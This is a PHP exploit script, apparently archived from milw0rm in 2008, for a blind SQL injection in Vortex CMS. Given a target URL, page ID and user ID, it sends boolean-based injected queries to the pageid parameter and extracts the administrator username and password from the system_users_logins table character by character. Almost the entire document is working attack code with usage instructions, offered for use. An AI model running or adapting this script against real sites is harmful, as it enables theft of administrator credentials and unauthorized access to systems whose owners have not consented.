<?php
ini_set("max_execution_time",0);
print_r('
###############################################################
#
#   Vortex CMS - Blind SQL Injection Exploit     
#                                                             
#      Vulnerability discovered by: Lidloses_Auge             
#      Exploit coded by:            Lidloses_Auge
#      Greetz to:                   -=Player=- , Suicide, g4ms3, enco
#                                   GPM, Free-Hack
#      Date:                        10.05.2008
#
###############################################################
#                                                             
#      Usage: php '.$argv[0].' [Target] [Page ID] [User ID]
#      Example for "http://www.site.com/cms/index.php?pageid=1"
#      => php '.$argv[0].' http://www.site.com/cms/ 1 1
#                                                             
###############################################################
');
if ($argc > 1) {
print_r('
');
   echo 'Searching for Admin: ';
   for($i=1; $i <= 50; $i++) { 
      $temp1 = file_get_contents($argv[1].'index.php?pageid='.$argv[2].'\'and+length((select+username+from+system_users_logins+where+id='.$argv[3].'))='.$i.'/*');
      if (strpos($temp1,'Sorry, the page you requested could not be found.') == 0) {
         $adlen = $i;
         $i = 50;
      }
   }
   for($i=1; $i <= $adlen; $i++) {
      for($zahl=46; $zahl <= 122; $zahl++) {
         $temp = file_get_contents($argv[1].'index.php?pageid='.$argv[2].'\'and+ascii(substring((select+username+from+system_users_logins+where+id='.$argv[3].'),'.$i.',1))='.$zahl.'/*');
         if (strpos($temp,'Sorry, the page you requested could not be found.') == 0) {
            echo chr($zahl);
            $zahl = 122;
         }
         if ($zahl == 57) {
            $zahl = 64;
         }
      }
   }
print_r('
');
   echo 'Searching for Password: ';
   for($i=1; $i <= 50; $i++) { 
      $temp1 = file_get_contents($argv[1].'index.php?pageid='.$argv[2].'\'and+length((select+password+from+system_users_logins+where+id='.$argv[3].'))='.$i.'/*');
      if (strpos($temp1,'Sorry, the page you requested could not be found.') == 0) {
         $adlen = $i;
         $i = 50;
      }
   }
   for($i=1; $i <= $adlen; $i++) {
      for($zahl=46; $zahl <= 122; $zahl++) {
         $temp = file_get_contents($argv[1].'index.php?pageid='.$argv[2].'\'and+ascii(substring((select+password+from+system_users_logins+where+id='.$argv[3].'),'.$i.',1))='.$zahl.'/*');
         if (strpos($temp,'Sorry, the page you requested could not be found.') == 0) {
            echo chr($zahl);
            $zahl = 122;
         }
         if ($zahl == 57) {
            $zahl = 64;
         }
      }
   }
}
?>

# milw0rm.com [2008-05-11]